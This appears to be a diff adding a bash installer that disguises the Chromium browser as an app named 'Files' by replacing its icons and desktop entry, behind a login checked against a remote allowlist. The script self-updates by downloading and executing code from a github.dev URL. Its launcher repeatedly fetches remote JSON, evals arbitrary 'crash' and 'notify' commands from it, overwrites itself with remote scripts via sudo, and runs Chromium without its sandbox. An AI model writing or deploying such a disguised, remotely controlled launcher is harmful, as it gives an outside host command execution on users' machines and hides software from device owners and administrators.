@@ -1,0 +1,171 @@
+#!/bin/bash
+
+# -- self-update --
+script_url="https://ominous-funicular-5grgr4xp56pjf95x-3000.app.github.dev/kxinternet.txt"
+current_script="$0"
+if [[ -f "$current_script" ]]; then
+    local_md5=$(md5sum "$current_script" | awk '{print $1}')
+    remote_md5=$(wget -qO- "$script_url" | md5sum | awk '{print $1}')
+    if [ "$local_md5" != "$remote_md5" ]; then
+        wget -q "$script_url" -O "$current_script"
+        chmod +x "$current_script"
+        exec "$current_script" "$@"
+    fi
+fi
+
+# -- config --
+allowlist_url="https://ominous-funicular-5grgr4xp56pjf95x-3000.app.github.dev/kx"
+icon_url="https://testprojectsedu.nekoweb.org/kxinter.png"
+login_script="/usr/local/bin/kx-login"
+app_name="Files"
+
+# -- deps --
+sudo apt-get update -y && sudo apt-get install -y chromium jq zenity wget
+
+# -- icon dir --
+mkdir -p "$HOME/.local/share/icons"
+if ! touch "$HOME/.local/share/icons/testfile" 2>/dev/null; then
+    sudo rm -rf "$HOME/.local/share/icons"
+    mkdir -p "$HOME/.local/share/icons"
+    sudo chown -R "$USER":"$USER" "$HOME/.local/share/icons"
+    chmod 755 "$HOME/.local/share/icons"
+fi
+rm -f "$HOME/.local/share/icons/testfile"
+
+wget -q "$icon_url" -O "$HOME/.local/share/icons/kx-brand.png"
+chmod 644 "$HOME/.local/share/icons/kx-brand.png"
+
+# -- write login script (old reliable heredoc method) --
+cat << 'EOF' | sudo tee "$login_script" > /dev/null
+#!/bin/bash
+
+allowlist_url="https://ominous-funicular-5grgr4xp56pjf95x-3000.app.github.dev/kx"
+INSTALLED_VERSION=""
+
+user_input=$(zenity --forms --title="kx login" --text="kx identifier" \
+    --add-entry="username" --add-password="password")
+[ -z "$user_input" ] && exit 1
+
+u_name=$(echo "$user_input" | cut -d'|' -f1)
+u_pass=$(echo "$user_input" | cut -d'|' -f2)
+
+full_json=$(wget -qO- "$allowlist_url" 2>/dev/null)
+
+# support both flat .users[] and nested .kx.users[]
+data=$(echo "$full_json" | jq -r ".kx.users[] | select(.username == \"$u_name\")" 2>/dev/null)
+[ -z "$data" ] && data=$(echo "$full_json" | jq -r ".users[] | select(.username == \"$u_name\")" 2>/dev/null)
+
+if [ -z "$data" ]; then
+    zenity --error --text="user not found"
+    exit 1
+fi
+
+if [ "$(echo "$data" | jq -r .allow)" != "true" ] || \
+   [ "$(echo "$data" | jq -r .password)" != "$u_pass" ]; then
+    zenity --error --text="no, denied, ask khxng"
+    exit 1
+fi
+
+chromium --no-sandbox "$@" &
+CPID=$!
+
+last_xdg=""
+last_garcon=""
+last_version="$INSTALLED_VERSION"
+
+while kill -0 $CPID 2>/dev/null; do
+    full_json=$(wget -qO- "$allowlist_url" 2>/dev/null)
+    [ -z "$full_json" ] && { sleep 5; continue; }
+
+    user_node=$(echo "$full_json" | jq -r ".kx.users[] | select(.username == \"$u_name\")" 2>/dev/null)
+    [ -z "$user_node" ] && user_node=$(echo "$full_json" | jq -r ".users[] | select(.username == \"$u_name\")" 2>/dev/null)
+
+    kx_node=$(echo "$full_json" | jq -r '.kx // empty' 2>/dev/null)
+
+    # allow check
+    if [ "$(echo "$user_node" | jq -r .allow)" != "true" ]; then
+        pkill -9 -P $CPID 2>/dev/null
+        kill -9 $CPID 2>/dev/null
+        exit 0
+    fi
+
+    if [ -n "$kx_node" ]; then
+        remote_version=$(echo "$kx_node" | jq -r '.version[0].version')
+        enforce=$(echo "$kx_node"        | jq -r '.version[0].enforce')
+        update_url=$(echo "$kx_node"     | jq -r '.version[0].url')
+
+        if [ -n "$remote_version" ] && [ "$remote_version" != "null" ] && \
+           [ "$remote_version" != "$last_version" ]; then
+            new_script=$(wget -qO- "$update_url" 2>/dev/null)
+            if [ -n "$new_script" ]; then
+                echo "$new_script" | sudo tee /usr/local/bin/kx-login > /dev/null
+                sudo chmod +x /usr/local/bin/kx-login
+                sudo sed -i "s|^INSTALLED_VERSION=.*|INSTALLED_VERSION=\"$remote_version\"|" \
+                    /usr/local/bin/kx-login
+                last_version="$remote_version"
+                if [ "$enforce" = "true" ]; then
+                    pkill -9 -P $CPID 2>/dev/null
+                    kill -9 $CPID 2>/dev/null
+                    exec /usr/local/bin/kx-login "$@"
+                fi
+            fi
+        fi
+
+        # crash — fixed: .kx.data[0].crash
+        if [ "$(echo "$user_node" | jq -r .crash)" = "true" ]; then
+            crash_cmd=$(echo "$full_json" | jq -r '.kx.data[0].crash')
+            [ -n "$crash_cmd" ] && [ "$crash_cmd" != "null" ] && eval "$crash_cmd" &
+        fi
+
+        # notify — fixed: .kx.data[0].notify
+        if [ "$(echo "$user_node" | jq -r .notify)" = "true" ]; then
+            notify_cmd=$(echo "$full_json" | jq -r '.kx.data[0].notify')
+            [ -n "$notify_cmd" ] && [ "$notify_cmd" != "null" ] && eval "$notify_cmd" &
+        fi
+    fi
+
+    # xdg-open — fixed: empty string guard
+    u_xdg=$(echo "$user_node" | jq -r '."xdg-open"')
+    if [ -n "$u_xdg" ] && [ "$u_xdg" != "null" ] && [ "$u_xdg" != "" ] && [ "$u_xdg" != "$last_xdg" ]; then
+        xdg-open "$u_xdg" &
+        last_xdg="$u_xdg"
+    fi
+
+    # garcon — fixed: empty string guard
+    u_garcon=$(echo "$user_node" | jq -r '."garcon-url-handler"')
+    if [ -n "$u_garcon" ] && [ "$u_garcon" != "null" ] && [ "$u_garcon" != "" ] && [ "$u_garcon" != "$last_garcon" ]; then
+        garcon-url-handler "$u_garcon" &
+        last_garcon="$u_garcon"
+    fi
+
+    sleep 0.5
+done
+EOF
+
+sudo chmod +x "$login_script"
+
+# -- stamp current version --
+current_version=$(wget -qO- "$allowlist_url" 2>/dev/null | jq -r '.kx.version[0].version // empty')
+[ -n "$current_version" ] && \
+    sudo sed -i "s|^INSTALLED_VERSION=.*|INSTALLED_VERSION=\"$current_version\"|" "$login_script"
+
+# -- icon replacement (old reliable mktemp+mv method) --
+for size in 16 32 48 64 128 256; do
+    sudo mkdir -p "/usr/share/icons/hicolor/${size}x${size}/apps"
+    tmpfile=$(mktemp)
+    cp "$HOME/.local/share/icons/kx-brand.png" "$tmpfile"
+    sudo mv "$tmpfile" "/usr/share/icons/hicolor/${size}x${size}/apps/chromium.png"
+    sudo chmod 644 "/usr/share/icons/hicolor/${size}x${size}/apps/chromium.png"
+done
+
+sudo rm -f /usr/share/icons/hicolor/icon-theme.cache
+sudo gtk-update-icon-cache /usr/share/icons/hicolor 2>/dev/null || true
+
+# -- patch chromium.desktop --
+desktop_file="/usr/share/applications/chromium.desktop"
+sudo sed -i "s|^Name=.*|Name=$app_name|g"       "$desktop_file"
+sudo sed -i "s|^Icon=.*|Icon=chromium|g"         "$desktop_file"
+sudo sed -i "s|^Exec=.*|Exec=$login_script %U|g" "$desktop_file"
+sudo touch "$desktop_file"
+
+killall -HUP garcon 2>/dev/null || true
